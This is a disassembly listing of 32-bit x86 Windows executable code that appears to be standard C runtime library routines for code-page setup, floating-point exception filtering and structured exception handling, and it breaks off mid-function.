  4039fb:	83 fe fe             	cmp    $0xfffffffe,%esi
  4039fe:	89 1d 24 d2 40 00    	mov    %ebx,0x40d224
  403a04:	75 1e                	jne    0x403a24
  403a06:	c7 05 24 d2 40 00 01 	movl   $0x1,0x40d224
  403a0d:	00 00 00 
  403a10:	ff 15 f8 90 40 00    	call   *0x4090f8
  403a16:	38 5d fc             	cmp    %bl,-0x4(%ebp)
  403a19:	74 45                	je     0x403a60
  403a1b:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  403a1e:	83 61 70 fd          	andl   $0xfffffffd,0x70(%ecx)
  403a22:	eb 3c                	jmp    0x403a60
  403a24:	83 fe fd             	cmp    $0xfffffffd,%esi
  403a27:	75 12                	jne    0x403a3b
  403a29:	c7 05 24 d2 40 00 01 	movl   $0x1,0x40d224
  403a30:	00 00 00 
  403a33:	ff 15 f4 90 40 00    	call   *0x4090f4
  403a39:	eb db                	jmp    0x403a16
  403a3b:	83 fe fc             	cmp    $0xfffffffc,%esi
  403a3e:	75 12                	jne    0x403a52
  403a40:	8b 45 f0             	mov    -0x10(%ebp),%eax
  403a43:	8b 40 04             	mov    0x4(%eax),%eax
  403a46:	c7 05 24 d2 40 00 01 	movl   $0x1,0x40d224
  403a4d:	00 00 00 
  403a50:	eb c4                	jmp    0x403a16
  403a52:	38 5d fc             	cmp    %bl,-0x4(%ebp)
  403a55:	74 07                	je     0x403a5e
  403a57:	8b 45 f8             	mov    -0x8(%ebp),%eax
  403a5a:	83 60 70 fd          	andl   $0xfffffffd,0x70(%eax)
  403a5e:	8b c6                	mov    %esi,%eax
  403a60:	5b                   	pop    %ebx
  403a61:	c9                   	leave
  403a62:	c3                   	ret
  403a63:	55                   	push   %ebp
  403a64:	8b ec                	mov    %esp,%ebp
  403a66:	83 ec 20             	sub    $0x20,%esp
  403a69:	a1 20 c0 40 00       	mov    0x40c020,%eax
  403a6e:	33 c5                	xor    %ebp,%eax
  403a70:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403a73:	53                   	push   %ebx
  403a74:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  403a77:	56                   	push   %esi
  403a78:	8b 75 08             	mov    0x8(%ebp),%esi
  403a7b:	57                   	push   %edi
  403a7c:	e8 68 ff ff ff       	call   0x4039e9
  403a81:	8b f8                	mov    %eax,%edi
  403a83:	33 f6                	xor    %esi,%esi
  403a85:	3b fe                	cmp    %esi,%edi
  403a87:	89 7d 08             	mov    %edi,0x8(%ebp)
  403a8a:	75 0e                	jne    0x403a9a
  403a8c:	8b c3                	mov    %ebx,%eax
  403a8e:	e8 51 fc ff ff       	call   0x4036e4
  403a93:	33 c0                	xor    %eax,%eax
  403a95:	e9 93 01 00 00       	jmp    0x403c2d
  403a9a:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  403a9d:	33 c0                	xor    %eax,%eax
  403a9f:	39 b8 a8 c6 40 00    	cmp    %edi,0x40c6a8(%eax)
  403aa5:	0f 84 91 00 00 00    	je     0x403b3c
  403aab:	ff 45 e4             	incl   -0x1c(%ebp)
  403aae:	83 c0 30             	add    $0x30,%eax
  403ab1:	3d f0 00 00 00       	cmp    $0xf0,%eax
  403ab6:	72 e7                	jb     0x403a9f
  403ab8:	81 ff e8 fd 00 00    	cmp    $0xfde8,%edi
  403abe:	0f 84 66 01 00 00    	je     0x403c2a
  403ac4:	81 ff e9 fd 00 00    	cmp    $0xfde9,%edi
  403aca:	0f 84 5a 01 00 00    	je     0x403c2a
  403ad0:	0f b7 c7             	movzwl %di,%eax
  403ad3:	50                   	push   %eax
  403ad4:	ff 15 fc 90 40 00    	call   *0x4090fc
  403ada:	85 c0                	test   %eax,%eax
  403adc:	0f 84 48 01 00 00    	je     0x403c2a
  403ae2:	8d 45 e8             	lea    -0x18(%ebp),%eax
  403ae5:	50                   	push   %eax
  403ae6:	57                   	push   %edi
  403ae7:	ff 15 f0 90 40 00    	call   *0x4090f0
  403aed:	85 c0                	test   %eax,%eax
  403aef:	0f 84 29 01 00 00    	je     0x403c1e
  403af5:	68 01 01 00 00       	push   $0x101
  403afa:	8d 43 1c             	lea    0x1c(%ebx),%eax
  403afd:	56                   	push   %esi
  403afe:	50                   	push   %eax
  403aff:	e8 5c e4 ff ff       	call   0x401f60
  403b04:	33 d2                	xor    %edx,%edx
  403b06:	42                   	inc    %edx
  403b07:	83 c4 0c             	add    $0xc,%esp
  403b0a:	39 55 e8             	cmp    %edx,-0x18(%ebp)
  403b0d:	89 7b 04             	mov    %edi,0x4(%ebx)
  403b10:	89 73 0c             	mov    %esi,0xc(%ebx)
  403b13:	0f 86 f8 00 00 00    	jbe    0x403c11
  403b19:	80 7d ee 00          	cmpb   $0x0,-0x12(%ebp)
  403b1d:	0f 84 cf 00 00 00    	je     0x403bf2
  403b23:	8d 75 ef             	lea    -0x11(%ebp),%esi
  403b26:	8a 0e                	mov    (%esi),%cl
  403b28:	84 c9                	test   %cl,%cl
  403b2a:	0f 84 c2 00 00 00    	je     0x403bf2
  403b30:	0f b6 46 ff          	movzbl -0x1(%esi),%eax
  403b34:	0f b6 c9             	movzbl %cl,%ecx
  403b37:	e9 a6 00 00 00       	jmp    0x403be2
  403b3c:	68 01 01 00 00       	push   $0x101
  403b41:	8d 43 1c             	lea    0x1c(%ebx),%eax
  403b44:	56                   	push   %esi
  403b45:	50                   	push   %eax
  403b46:	e8 15 e4 ff ff       	call   0x401f60
  403b4b:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  403b4e:	83 c4 0c             	add    $0xc,%esp
  403b51:	6b c9 30             	imul   $0x30,%ecx,%ecx
  403b54:	89 75 e0             	mov    %esi,-0x20(%ebp)
  403b57:	8d b1 b8 c6 40 00    	lea    0x40c6b8(%ecx),%esi
  403b5d:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  403b60:	eb 2a                	jmp    0x403b8c
  403b62:	8a 46 01             	mov    0x1(%esi),%al
  403b65:	84 c0                	test   %al,%al
  403b67:	74 28                	je     0x403b91
  403b69:	0f b6 3e             	movzbl (%esi),%edi
  403b6c:	0f b6 c0             	movzbl %al,%eax
  403b6f:	eb 12                	jmp    0x403b83
  403b71:	8b 45 e0             	mov    -0x20(%ebp),%eax
  403b74:	8a 80 a4 c6 40 00    	mov    0x40c6a4(%eax),%al
  403b7a:	08 44 3b 1d          	or     %al,0x1d(%ebx,%edi,1)
  403b7e:	0f b6 46 01          	movzbl 0x1(%esi),%eax
  403b82:	47                   	inc    %edi
  403b83:	3b f8                	cmp    %eax,%edi
  403b85:	76 ea                	jbe    0x403b71
  403b87:	8b 7d 08             	mov    0x8(%ebp),%edi
  403b8a:	46                   	inc    %esi
  403b8b:	46                   	inc    %esi
  403b8c:	80 3e 00             	cmpb   $0x0,(%esi)
  403b8f:	75 d1                	jne    0x403b62
  403b91:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  403b94:	ff 45 e0             	incl   -0x20(%ebp)
  403b97:	83 c6 08             	add    $0x8,%esi
  403b9a:	83 7d e0 04          	cmpl   $0x4,-0x20(%ebp)
  403b9e:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  403ba1:	72 e9                	jb     0x403b8c
  403ba3:	8b c7                	mov    %edi,%eax
  403ba5:	89 7b 04             	mov    %edi,0x4(%ebx)
  403ba8:	c7 43 08 01 00 00 00 	movl   $0x1,0x8(%ebx)
  403baf:	e8 01 fb ff ff       	call   0x4036b5
  403bb4:	6a 06                	push   $0x6
  403bb6:	89 43 0c             	mov    %eax,0xc(%ebx)
  403bb9:	8d 43 10             	lea    0x10(%ebx),%eax
  403bbc:	8d 89 ac c6 40 00    	lea    0x40c6ac(%ecx),%ecx
  403bc2:	5a                   	pop    %edx
  403bc3:	66 8b 31             	mov    (%ecx),%si
  403bc6:	41                   	inc    %ecx
  403bc7:	66 89 30             	mov    %si,(%eax)
  403bca:	41                   	inc    %ecx
  403bcb:	40                   	inc    %eax
  403bcc:	40                   	inc    %eax
  403bcd:	4a                   	dec    %edx
  403bce:	75 f3                	jne    0x403bc3
  403bd0:	8b f3                	mov    %ebx,%esi
  403bd2:	e8 62 fb ff ff       	call   0x403739
  403bd7:	e9 b7 fe ff ff       	jmp    0x403a93
  403bdc:	80 4c 03 1d 04       	orb    $0x4,0x1d(%ebx,%eax,1)
  403be1:	40                   	inc    %eax
  403be2:	3b c1                	cmp    %ecx,%eax
  403be4:	76 f6                	jbe    0x403bdc
  403be6:	46                   	inc    %esi
  403be7:	46                   	inc    %esi
  403be8:	80 7e ff 00          	cmpb   $0x0,-0x1(%esi)
  403bec:	0f 85 34 ff ff ff    	jne    0x403b26
  403bf2:	8d 43 1e             	lea    0x1e(%ebx),%eax
  403bf5:	b9 fe 00 00 00       	mov    $0xfe,%ecx
  403bfa:	80 08 08             	orb    $0x8,(%eax)
  403bfd:	40                   	inc    %eax
  403bfe:	49                   	dec    %ecx
  403bff:	75 f9                	jne    0x403bfa
  403c01:	8b 43 04             	mov    0x4(%ebx),%eax
  403c04:	e8 ac fa ff ff       	call   0x4036b5
  403c09:	89 43 0c             	mov    %eax,0xc(%ebx)
  403c0c:	89 53 08             	mov    %edx,0x8(%ebx)
  403c0f:	eb 03                	jmp    0x403c14
  403c11:	89 73 08             	mov    %esi,0x8(%ebx)
  403c14:	33 c0                	xor    %eax,%eax
  403c16:	8d 7b 10             	lea    0x10(%ebx),%edi
  403c19:	ab                   	stos   %eax,%es:(%edi)
  403c1a:	ab                   	stos   %eax,%es:(%edi)
  403c1b:	ab                   	stos   %eax,%es:(%edi)
  403c1c:	eb b2                	jmp    0x403bd0
  403c1e:	39 35 24 d2 40 00    	cmp    %esi,0x40d224
  403c24:	0f 85 62 fe ff ff    	jne    0x403a8c
  403c2a:	83 c8 ff             	or     $0xffffffff,%eax
  403c2d:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  403c30:	5f                   	pop    %edi
  403c31:	5e                   	pop    %esi
  403c32:	33 cd                	xor    %ebp,%ecx
  403c34:	5b                   	pop    %ebx
  403c35:	e8 a0 e3 ff ff       	call   0x401fda
  403c3a:	c9                   	leave
  403c3b:	c3                   	ret
  403c3c:	6a 14                	push   $0x14
  403c3e:	68 b0 ae 40 00       	push   $0x40aeb0
  403c43:	e8 0c 03 00 00       	call   0x403f54
  403c48:	83 4d e0 ff          	orl    $0xffffffff,-0x20(%ebp)
  403c4c:	e8 97 e6 ff ff       	call   0x4022e8
  403c51:	8b f8                	mov    %eax,%edi
  403c53:	89 7d dc             	mov    %edi,-0x24(%ebp)
  403c56:	e8 68 fc ff ff       	call   0x4038c3
  403c5b:	8b 5f 68             	mov    0x68(%edi),%ebx
  403c5e:	8b 75 08             	mov    0x8(%ebp),%esi
  403c61:	e8 83 fd ff ff       	call   0x4039e9
  403c66:	89 45 08             	mov    %eax,0x8(%ebp)
  403c69:	3b 43 04             	cmp    0x4(%ebx),%eax
  403c6c:	0f 84 57 01 00 00    	je     0x403dc9
  403c72:	68 20 02 00 00       	push   $0x220
  403c77:	e8 ca 04 00 00       	call   0x404146
  403c7c:	59                   	pop    %ecx
  403c7d:	8b d8                	mov    %eax,%ebx
  403c7f:	85 db                	test   %ebx,%ebx
  403c81:	0f 84 46 01 00 00    	je     0x403dcd
  403c87:	b9 88 00 00 00       	mov    $0x88,%ecx
  403c8c:	8b 77 68             	mov    0x68(%edi),%esi
  403c8f:	8b fb                	mov    %ebx,%edi
  403c91:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  403c93:	83 23 00             	andl   $0x0,(%ebx)
  403c96:	53                   	push   %ebx
  403c97:	ff 75 08             	push   0x8(%ebp)
  403c9a:	e8 c4 fd ff ff       	call   0x403a63
  403c9f:	59                   	pop    %ecx
  403ca0:	59                   	pop    %ecx
  403ca1:	89 45 e0             	mov    %eax,-0x20(%ebp)
  403ca4:	85 c0                	test   %eax,%eax
  403ca6:	0f 85 fc 00 00 00    	jne    0x403da8
  403cac:	8b 75 dc             	mov    -0x24(%ebp),%esi
  403caf:	ff 76 68             	push   0x68(%esi)
  403cb2:	ff 15 c4 90 40 00    	call   *0x4090c4
  403cb8:	85 c0                	test   %eax,%eax
  403cba:	75 11                	jne    0x403ccd
  403cbc:	8b 46 68             	mov    0x68(%esi),%eax
  403cbf:	3d 78 c2 40 00       	cmp    $0x40c278,%eax
  403cc4:	74 07                	je     0x403ccd
  403cc6:	50                   	push   %eax
  403cc7:	e8 c3 ef ff ff       	call   0x402c8f
  403ccc:	59                   	pop    %ecx
  403ccd:	89 5e 68             	mov    %ebx,0x68(%esi)
  403cd0:	53                   	push   %ebx
  403cd1:	8b 3d b4 90 40 00    	mov    0x4090b4,%edi
  403cd7:	ff d7                	call   *%edi
  403cd9:	f6 46 70 02          	testb  $0x2,0x70(%esi)
  403cdd:	0f 85 ea 00 00 00    	jne    0x403dcd
  403ce3:	f6 05 b4 cb 40 00 01 	testb  $0x1,0x40cbb4
  403cea:	0f 85 dd 00 00 00    	jne    0x403dcd
  403cf0:	6a 0d                	push   $0xd
  403cf2:	e8 87 f6 ff ff       	call   0x40337e
  403cf7:	59                   	pop    %ecx
  403cf8:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  403cfc:	8b 43 04             	mov    0x4(%ebx),%eax
  403cff:	a3 34 d2 40 00       	mov    %eax,0x40d234
  403d04:	8b 43 08             	mov    0x8(%ebx),%eax
  403d07:	a3 38 d2 40 00       	mov    %eax,0x40d238
  403d0c:	8b 43 0c             	mov    0xc(%ebx),%eax
  403d0f:	a3 3c d2 40 00       	mov    %eax,0x40d23c
  403d14:	33 c0                	xor    %eax,%eax
  403d16:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  403d19:	83 f8 05             	cmp    $0x5,%eax
  403d1c:	7d 10                	jge    0x403d2e
  403d1e:	66 8b 4c 43 10       	mov    0x10(%ebx,%eax,2),%cx
  403d23:	66 89 0c 45 28 d2 40 	mov    %cx,0x40d228(,%eax,2)
  403d2a:	00 
  403d2b:	40                   	inc    %eax
  403d2c:	eb e8                	jmp    0x403d16
  403d2e:	33 c0                	xor    %eax,%eax
  403d30:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  403d33:	3d 01 01 00 00       	cmp    $0x101,%eax
  403d38:	7d 0d                	jge    0x403d47
  403d3a:	8a 4c 18 1c          	mov    0x1c(%eax,%ebx,1),%cl
  403d3e:	88 88 98 c4 40 00    	mov    %cl,0x40c498(%eax)
  403d44:	40                   	inc    %eax
  403d45:	eb e9                	jmp    0x403d30
  403d47:	33 c0                	xor    %eax,%eax
  403d49:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  403d4c:	3d 00 01 00 00       	cmp    $0x100,%eax
  403d51:	7d 10                	jge    0x403d63
  403d53:	8a 8c 18 1d 01 00 00 	mov    0x11d(%eax,%ebx,1),%cl
  403d5a:	88 88 a0 c5 40 00    	mov    %cl,0x40c5a0(%eax)
  403d60:	40                   	inc    %eax
  403d61:	eb e6                	jmp    0x403d49
  403d63:	ff 35 a0 c6 40 00    	push   0x40c6a0
  403d69:	ff 15 c4 90 40 00    	call   *0x4090c4
  403d6f:	85 c0                	test   %eax,%eax
  403d71:	75 13                	jne    0x403d86
  403d73:	a1 a0 c6 40 00       	mov    0x40c6a0,%eax
  403d78:	3d 78 c2 40 00       	cmp    $0x40c278,%eax
  403d7d:	74 07                	je     0x403d86
  403d7f:	50                   	push   %eax
  403d80:	e8 0a ef ff ff       	call   0x402c8f
  403d85:	59                   	pop    %ecx
  403d86:	89 1d a0 c6 40 00    	mov    %ebx,0x40c6a0
  403d8c:	53                   	push   %ebx
  403d8d:	ff d7                	call   *%edi
  403d8f:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  403d96:	e8 02 00 00 00       	call   0x403d9d
  403d9b:	eb 30                	jmp    0x403dcd
  403d9d:	6a 0d                	push   $0xd
  403d9f:	e8 02 f5 ff ff       	call   0x4032a6
  403da4:	59                   	pop    %ecx
  403da5:	c3                   	ret
  403da6:	eb 25                	jmp    0x403dcd
  403da8:	83 f8 ff             	cmp    $0xffffffff,%eax
  403dab:	75 20                	jne    0x403dcd
  403dad:	81 fb 78 c2 40 00    	cmp    $0x40c278,%ebx
  403db3:	74 07                	je     0x403dbc
  403db5:	53                   	push   %ebx
  403db6:	e8 d4 ee ff ff       	call   0x402c8f
  403dbb:	59                   	pop    %ecx
  403dbc:	e8 6c 06 00 00       	call   0x40442d
  403dc1:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  403dc7:	eb 04                	jmp    0x403dcd
  403dc9:	83 65 e0 00          	andl   $0x0,-0x20(%ebp)
  403dcd:	8b 45 e0             	mov    -0x20(%ebp),%eax
  403dd0:	e8 c4 01 00 00       	call   0x403f99
  403dd5:	c3                   	ret
  403dd6:	83 3d 18 d9 40 00 00 	cmpl   $0x0,0x40d918
  403ddd:	75 12                	jne    0x403df1
  403ddf:	6a fd                	push   $0xfffffffd
  403de1:	e8 56 fe ff ff       	call   0x403c3c
  403de6:	59                   	pop    %ecx
  403de7:	c7 05 18 d9 40 00 01 	movl   $0x1,0x40d918
  403dee:	00 00 00 
  403df1:	33 c0                	xor    %eax,%eax
  403df3:	c3                   	ret
  403df4:	c3                   	ret
  403df5:	55                   	push   %ebp
  403df6:	8b ec                	mov    %esp,%ebp
  403df8:	51                   	push   %ecx
  403df9:	51                   	push   %ecx
  403dfa:	56                   	push   %esi
  403dfb:	e8 71 e4 ff ff       	call   0x402271
  403e00:	8b f0                	mov    %eax,%esi
  403e02:	85 f6                	test   %esi,%esi
  403e04:	0f 84 46 01 00 00    	je     0x403f50
  403e0a:	8b 56 5c             	mov    0x5c(%esi),%edx
  403e0d:	a1 1c c8 40 00       	mov    0x40c81c,%eax
  403e12:	57                   	push   %edi
  403e13:	8b 7d 08             	mov    0x8(%ebp),%edi
  403e16:	8b ca                	mov    %edx,%ecx
  403e18:	53                   	push   %ebx
  403e19:	39 39                	cmp    %edi,(%ecx)
  403e1b:	74 0e                	je     0x403e2b
  403e1d:	8b d8                	mov    %eax,%ebx
  403e1f:	6b db 0c             	imul   $0xc,%ebx,%ebx
  403e22:	83 c1 0c             	add    $0xc,%ecx
  403e25:	03 da                	add    %edx,%ebx
  403e27:	3b cb                	cmp    %ebx,%ecx
  403e29:	72 ee                	jb     0x403e19
  403e2b:	6b c0 0c             	imul   $0xc,%eax,%eax
  403e2e:	03 c2                	add    %edx,%eax
  403e30:	3b c8                	cmp    %eax,%ecx
  403e32:	73 08                	jae    0x403e3c
  403e34:	39 39                	cmp    %edi,(%ecx)
  403e36:	75 04                	jne    0x403e3c
  403e38:	8b c1                	mov    %ecx,%eax
  403e3a:	eb 02                	jmp    0x403e3e
  403e3c:	33 c0                	xor    %eax,%eax
  403e3e:	85 c0                	test   %eax,%eax
  403e40:	74 0a                	je     0x403e4c
  403e42:	8b 58 08             	mov    0x8(%eax),%ebx
  403e45:	85 db                	test   %ebx,%ebx
  403e47:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  403e4a:	75 07                	jne    0x403e53
  403e4c:	33 c0                	xor    %eax,%eax
  403e4e:	e9 fb 00 00 00       	jmp    0x403f4e
  403e53:	83 fb 05             	cmp    $0x5,%ebx
  403e56:	75 0c                	jne    0x403e64
  403e58:	83 60 08 00          	andl   $0x0,0x8(%eax)
  403e5c:	33 c0                	xor    %eax,%eax
  403e5e:	40                   	inc    %eax
  403e5f:	e9 ea 00 00 00       	jmp    0x403f4e
  403e64:	83 fb 01             	cmp    $0x1,%ebx
  403e67:	0f 84 de 00 00 00    	je     0x403f4b
  403e6d:	8b 4e 60             	mov    0x60(%esi),%ecx
  403e70:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  403e73:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  403e76:	89 4e 60             	mov    %ecx,0x60(%esi)
  403e79:	8b 48 04             	mov    0x4(%eax),%ecx
  403e7c:	83 f9 08             	cmp    $0x8,%ecx
  403e7f:	0f 85 b8 00 00 00    	jne    0x403f3d
  403e85:	8b 0d 10 c8 40 00    	mov    0x40c810,%ecx
  403e8b:	8b 3d 14 c8 40 00    	mov    0x40c814,%edi
  403e91:	8b d1                	mov    %ecx,%edx
  403e93:	03 f9                	add    %ecx,%edi
  403e95:	3b d7                	cmp    %edi,%edx
  403e97:	7d 24                	jge    0x403ebd
  403e99:	6b c9 0c             	imul   $0xc,%ecx,%ecx
  403e9c:	8b 7e 5c             	mov    0x5c(%esi),%edi
  403e9f:	83 64 39 08 00       	andl   $0x0,0x8(%ecx,%edi,1)
  403ea4:	8b 3d 10 c8 40 00    	mov    0x40c810,%edi
  403eaa:	8b 1d 14 c8 40 00    	mov    0x40c814,%ebx
  403eb0:	42                   	inc    %edx
  403eb1:	03 df                	add    %edi,%ebx
  403eb3:	83 c1 0c             	add    $0xc,%ecx
  403eb6:	3b d3                	cmp    %ebx,%edx
  403eb8:	7c e2                	jl     0x403e9c
  403eba:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  403ebd:	8b 00                	mov    (%eax),%eax
  403ebf:	3d 8e 00 00 c0       	cmp    $0xc000008e,%eax
  403ec4:	8b 7e 64             	mov    0x64(%esi),%edi
  403ec7:	75 09                	jne    0x403ed2
  403ec9:	c7 46 64 83 00 00 00 	movl   $0x83,0x64(%esi)
  403ed0:	eb 5e                	jmp    0x403f30
  403ed2:	3d 90 00 00 c0       	cmp    $0xc0000090,%eax
  403ed7:	75 09                	jne    0x403ee2
  403ed9:	c7 46 64 81 00 00 00 	movl   $0x81,0x64(%esi)
  403ee0:	eb 4e                	jmp    0x403f30
  403ee2:	3d 91 00 00 c0       	cmp    $0xc0000091,%eax
  403ee7:	75 09                	jne    0x403ef2
  403ee9:	c7 46 64 84 00 00 00 	movl   $0x84,0x64(%esi)
  403ef0:	eb 3e                	jmp    0x403f30
  403ef2:	3d 93 00 00 c0       	cmp    $0xc0000093,%eax
  403ef7:	75 09                	jne    0x403f02
  403ef9:	c7 46 64 85 00 00 00 	movl   $0x85,0x64(%esi)
  403f00:	eb 2e                	jmp    0x403f30
  403f02:	3d 8d 00 00 c0       	cmp    $0xc000008d,%eax
  403f07:	75 09                	jne    0x403f12
  403f09:	c7 46 64 82 00 00 00 	movl   $0x82,0x64(%esi)
  403f10:	eb 1e                	jmp    0x403f30
  403f12:	3d 8f 00 00 c0       	cmp    $0xc000008f,%eax
  403f17:	75 09                	jne    0x403f22
  403f19:	c7 46 64 86 00 00 00 	movl   $0x86,0x64(%esi)
  403f20:	eb 0e                	jmp    0x403f30
  403f22:	3d 92 00 00 c0       	cmp    $0xc0000092,%eax
  403f27:	75 07                	jne    0x403f30
  403f29:	c7 46 64 8a 00 00 00 	movl   $0x8a,0x64(%esi)
  403f30:	ff 76 64             	push   0x64(%esi)
  403f33:	6a 08                	push   $0x8
  403f35:	ff d3                	call   *%ebx
  403f37:	59                   	pop    %ecx
  403f38:	89 7e 64             	mov    %edi,0x64(%esi)
  403f3b:	eb 07                	jmp    0x403f44
  403f3d:	83 60 08 00          	andl   $0x0,0x8(%eax)
  403f41:	51                   	push   %ecx
  403f42:	ff d3                	call   *%ebx
  403f44:	8b 45 f8             	mov    -0x8(%ebp),%eax
  403f47:	59                   	pop    %ecx
  403f48:	89 46 60             	mov    %eax,0x60(%esi)
  403f4b:	83 c8 ff             	or     $0xffffffff,%eax
  403f4e:	5b                   	pop    %ebx
  403f4f:	5f                   	pop    %edi
  403f50:	5e                   	pop    %esi
  403f51:	c9                   	leave
  403f52:	c3                   	ret
  403f53:	cc                   	int3
  403f54:	68 b0 3f 40 00       	push   $0x403fb0
  403f59:	64 ff 35 00 00 00 00 	push   %fs:0x0
  403f60:	8b 44 24 10          	mov    0x10(%esp),%eax
  403f64:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  403f68:	8d 6c 24 10          	lea    0x10(%esp),%ebp
  403f6c:	2b e0                	sub    %eax,%esp
  403f6e:	53                   	push   %ebx
  403f6f:	56                   	push   %esi
  403f70:	57                   	push   %edi
  403f71:	a1 20 c0 40 00       	mov    0x40c020,%eax
  403f76:	31 45 fc             	xor    %eax,-0x4(%ebp)
  403f79:	33 c5                	xor    %ebp,%eax
  403f7b:	50                   	push   %eax
  403f7c:	89 65 e8             	mov    %esp,-0x18(%ebp)
  403f7f:	ff 75 f8             	push   -0x8(%ebp)
  403f82:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403f85:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  403f8c:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403f8f:	8d 45 f0             	lea    -0x10(%ebp),%eax
  403f92:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  403f98:	c3                   	ret
  403f99:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  403f9c:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403fa3:	59                   	pop    %ecx
  403fa4:	5f                   	pop    %edi
  403fa5:	5f                   	pop    %edi
  403fa6:	5e                   	pop    %esi
  403fa7:	5b                   	pop    %ebx
  403fa8:	8b e5                	mov    %ebp,%esp
  403faa:	5d                   	pop    %ebp
  403fab:	51                   	push   %ecx
  403fac:	c3                   	ret
  403fad:	cc                   	int3
  403fae:	cc                   	int3
  403faf:	cc                   	int3
  403fb0:	83 ec 14             	sub    $0x14,%esp
  403fb3:	53                   	push   %ebx
  403fb4:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  403fb8:	55                   	push   %ebp
  403fb9:	56                   	push   %esi
  403fba:	8b 73 08             	mov    0x8(%ebx),%esi
  403fbd:	33 35 20 c0 40 00    	xor    0x40c020,%esi
  403fc3:	57                   	push   %edi
  403fc4:	8b 06                	mov    (%esi),%eax
  403fc6:	83 f8 fe             	cmp    $0xfffffffe,%eax
  403fc9:	c6 44 24 13 00       	movb   $0x0,0x13(%esp)
  403fce:	c7 44 24 18 01 00 00 	movl   $0x1,0x18(%esp)
  403fd5:	00 
  403fd6:	8d 7b 10             	lea    0x10(%ebx),%edi
  403fd9:	74 0d                	je     0x403fe8
  403fdb:	8b 4e 04             	mov    0x4(%esi),%ecx
  403fde:	03 cf                	add    %edi,%ecx
  403fe0:	33 0c 38             	xor    (%eax,%edi,1),%ecx
  403fe3:	e8 f2 df ff ff       	call   0x401fda
  403fe8:	8b 4e 0c             	mov    0xc(%esi),%ecx
  403feb:	8b 46 08             	mov    0x8(%esi),%eax
  403fee:	03 cf                	add    %edi,%ecx
  403ff0:	33 0c 38             	xor    (%eax,%edi,1),%ecx
  403ff3:	e8 e2 df ff ff       	call   0x401fda
  403ff8:	8b 44 24 28          	mov    0x28(%esp),%eax
  403ffc:	f6 40 04 66          	testb  $0x66,0x4(%eax)
  404000:	0f 85 1f 01 00 00    	jne    0x404125
  404006:	8b 6b 0c             	mov    0xc(%ebx),%ebp
  404009:	83 fd fe             	cmp    $0xfffffffe,%ebp
  40400c:	8b 4c 24 30          	mov    0x30(%esp),%ecx
  404010:	8d 54 24 1c          	lea    0x1c(%esp),%edx
  404014:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  404018:	89 4c 24 20          	mov    %ecx,0x20(%esp)
  40401c:	89 53 fc             	mov    %edx,-0x4(%ebx)
  40401f:	74 5e                	je     0x40407f
  404021:	8d 44 6d 00          	lea    0x0(%ebp,%ebp,2),%eax
  404025:	8b 4c 86 14          	mov    0x14(%esi,%eax,4),%ecx
  404029:	85 c9                	test   %ecx,%ecx
  40402b:	8d 5c 86 10          	lea    0x10(%esi,%eax,4),%ebx
  40402f:	8b 03                	mov    (%ebx),%eax
  404031:	89 44 24 14          	mov    %eax,0x14(%esp)
  404035:	74 16                	je     0x40404d
  404037:	8b d7                	mov    %edi,%edx
  404039:	e8 7c 2c 00 00       	call   0x406cba
  40403e:	85 c0                	test   %eax,%eax
  404040:	c6 44 24 13 01       	movb   $0x1,0x13(%esp)
  404045:	7c 44                	jl     0x40408b
  404047:	7f 4c                	jg     0x404095
  404049:	8b 44 24 14          	mov    0x14(%esp),%eax
  40404d:	83 f8 fe             	cmp    $0xfffffffe,%eax
  404050:	8b e8                	mov    %eax,%ebp
  404052:	75 cd                	jne    0x404021
  404054:	80 7c 24 13 00       	cmpb   $0x0,0x13(%esp)
  404059:	74 24                	je     0x40407f
  40405b:	8b 06                	mov    (%esi),%eax
  40405d:	83 f8 fe             	cmp    $0xfffffffe,%eax
  404060:	74 0d                	je     0x40406f
  404062:	8b 4e 04             	mov    0x4(%esi),%ecx
  404065:	03 cf                	add    %edi,%ecx
  404067:	33 0c 38             	xor    (%eax,%edi,1),%ecx
  40406a:	e8 6b df ff ff       	call   0x401fda
  40406f:	8b 4e 0c             	mov    0xc(%esi),%ecx
  404072:	8b 46 08             	mov    0x8(%esi),%eax
  404075:	03 cf                	add    %edi,%ecx
  404077:	33 0c 38             	xor    (%eax,%edi,1),%ecx
  40407a:	e8 5b df ff ff       	call   0x401fda
  40407f:	8b 44 24 18          	mov    0x18(%esp),%eax
  404083:	5f                   	pop    %edi
  404084:	5e                   	pop    %esi
  404085:	5d                   	pop    %ebp
  404086:	5b                   	pop    %ebx
  404087:	83 c4 14             	add    $0x14,%esp
  40408a:	c3                   	ret
  40408b:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  404092:	00 
  404093:	eb c6                	jmp    0x40405b
  404095:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  404099:	81 39 63 73 6d e0    	cmpl   $0xe06d7363,(%ecx)
  40409f:	75 2a                	jne    0x4040cb
  4040a1:	83 3d fc d8 40 00 00 	cmpl   $0x0,0x40d8fc
  4040a8:	74 21                	je     0x4040cb
  4040aa:	68 fc d8 40 00       	push   $0x40d8fc
